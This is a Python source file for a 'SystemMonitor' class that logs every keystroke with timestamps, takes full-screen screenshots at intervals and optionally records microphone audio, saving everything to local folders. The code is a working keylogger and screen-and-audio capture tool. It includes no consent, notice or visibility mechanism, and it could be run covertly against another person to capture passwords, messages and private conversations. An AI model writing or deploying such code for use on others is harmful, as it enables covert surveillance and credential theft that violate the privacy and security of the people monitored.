import os
import threading
import time
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
import sounddevice as sd
import soundfile as sf

class SystemMonitor:
    def __init__(self, log_dir='logs', screenshot_dir='activity_snapshots', audio_dir='audio_recordings'):
        self.screenshot_dir = screenshot_dir
        self.log_dir = log_dir
        self.audio_dir = audio_dir
        self.running = False
        self.keylogger_listener = None
        self.audio_thread = None
        self.audio_recording = False
        self.audio_file = None
        self.audio_stream = None

        # Create directories if they don't exist
        os.makedirs(self.screenshot_dir, exist_ok=True)
        os.makedirs(self.log_dir, exist_ok=True)
        os.makedirs(self.audio_dir, exist_ok=True)

        # Initialize log file for the session
        self.session_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.log_dir, f'system_activity_{self.session_timestamp}.txt')
        with open(self.log_file, 'a') as f:
            f.write(f"Monitoring initialized at {datetime.now()}\n")

    def on_key_press(self, key):
        with open(self.log_file, 'a') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            try:
                key_str = key.char
            except AttributeError:
                key_str = f'[{key.name}]'
            f.write(f"{timestamp} - Key: {key_str}\n")

    def take_screenshot(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"snapshot_{timestamp}.png"
        filepath = os.path.join(self.screenshot_dir, filename)
        
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            with open(self.log_file, 'a') as f:
                f.write(f"Screenshot saved: {filepath}\n")
        except Exception as e:
            with open(self.log_file, 'a') as f:
                f.write(f"Screenshot error: {str(e)}\n")

    def monitor_screenshots(self, screenshot_interval):
        while self.running:
            self.take_screenshot()
            time.sleep(screenshot_interval)

    def start_audio_recording(self, duration=None):
        if self.audio_recording:
            return  # Already recording

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_recording_{timestamp}.wav"
        filepath = os.path.join(self.audio_dir, filename)
        self.audio_file = filepath

        try:
            with sf.SoundFile(filepath, mode='w', samplerate=44100, channels=2) as file:
                with sd.InputStream(samplerate=44100, channels=2) as stream:
                    self.audio_recording = True
                    while self.audio_recording:
                        data, _ = stream.read(1024)
                        file.write(data)
        except Exception as e:
            with open(self.log_file, 'a') as f:
                f.write(f"Audio recording error: {str(e)}\n")

    def stop_audio_recording(self):
        if self.audio_recording:
            self.audio_recording = False

    def monitor_audio(self):
        self.start_audio_recording()

    def start_monitoring(self, screenshot_interval, enable_keylogger=True, enable_screenshots=True, enable_audio=False):
        self.running = True
        
        if enable_keylogger:
            self.keylogger_listener = keyboard.Listener(on_press=self.on_key_press)
            self.keylogger_listener.start()
        
        if enable_screenshots:
            screenshot_thread = threading.Thread(target=self.monitor_screenshots, args=(screenshot_interval,), daemon=True)
            screenshot_thread.start()
        
        if enable_audio:
            self.audio_thread = threading.Thread(target=self.monitor_audio, daemon=True)
            self.audio_thread.start()
            with open(self.log_file, 'a') as f:
                f.write(f"Audio recording started at {datetime.now()}\n")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_monitoring()

    def stop_monitoring(self):
        self.running = False
        if self.keylogger_listener:
            self.keylogger_listener.stop()
        if self.audio_recording:
            self.stop_audio_recording()
        if self.audio_thread and self.audio_thread.is_alive():
            self.audio_thread.join()
        with open(self.log_file, 'a') as f:
            f.write(f"\nMonitoring stopped at {datetime.now()}\n")